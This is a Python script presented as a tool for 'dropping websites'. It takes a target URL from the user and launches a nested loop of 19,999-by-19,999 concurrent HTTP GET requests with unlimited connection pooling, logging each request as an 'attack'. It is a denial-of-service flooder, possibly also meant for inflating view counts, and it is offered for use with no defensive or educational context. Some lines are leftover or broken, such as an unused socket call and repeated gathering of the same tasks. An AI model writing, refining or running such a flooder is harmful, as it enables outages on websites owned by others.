import socket
import time
import asyncio
import aiohttp
import fade
import os
import requests
# Clear command prompt based on the operating system
if os.name == "nt":  # Windows
    os.system("cls")
else:  # Unix/Linux/Mac
    os.system("clear")

logo = """
         ±± ±±                    ±± ±±  ±±
       ±±   ±± ±±    ±±   ±±    ±±       ±±  ±±  ±±     ±±
      ±±  ±±     ±±  ±± ±±  ±±  ±±       ±±  ±±   ±±   ±±
      ±±  ±±     ±±  ±±     ±±  ±± ±±    ±±  ±±    ±± ±±
      ±±  ±±     ±±  ±±     ±±  ±±       ±±  ±±   ±±   ±±
       ±±   ±± ±±    ±±     ±±  ±±       ±±  ±±  ±±     ±±
         ±± ±±                  ±±       ±±
╔═══════════════════════════════════════════════════════════╗
║\033[34m        TOOLS TO DETECT AND DROPPING WEBSITES                 ║
║\033[32m                     DESIGN BY: KF24                          ║
║\033[33m        IF IN DOUBT OF ACCURACY, PLEASE HELP                  ║
║\033[91m                   BY CHECKING THE HOST                       ║
║\033[36m                         ——oO0Oo——                            ║
╚═══════════════════════════════════════════════════════════╝
"""
faded_text = fade.fire(logo)
print(faded_text)
socket.socket(socket.AF_INET, socket.SOCK_STREAM)
addr = (str(),int())
ask = fade.pinkred("Enter the target URL:")
url = input(ask)
async def increment_view_count(session):
    try:
        async with session.get(url) as response:
            if response.status == 200:
                print("[+]  \033[32mRequest Sent  \033[33m" +url+"  \033[34mattack..!! \033[0m")
                print("[+]  \033[95mRequest Sent  \033[96m" +url+"  \033[92mattack..!! \033[0m")
            else:
                print("[!]  \033[96mRequest Sent  \033[32m" +url+"  \033[33mattack..!! \033[0m")
                print("[!]  \033[94mRequest Sent  \033[96m" +url+"  \033[37mattack..!! \033[0m")
    except aiohttp.ClientError as e:
        print("[💥]  \033[34mAn error occurred:\033[0m", e)

async def main():
    connector = aiohttp.TCPConnector(limit=None)  # Enable connection pooling
    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = []
        for _ in range(19999):  # Increase the number of concurrent requests
            task = asyncio.create_task(increment_view_count(session))
            tasks.append(task)
            for i in range(19999):  # Increase the number of concurrent requests
                task = asyncio.create_task(increment_view_count(session))
                tasks.append(task)
            await asyncio.gather(*tasks)
        await asyncio.gather(*tasks)


if __name__ == "__main__":
    asyncio.run(main())
    
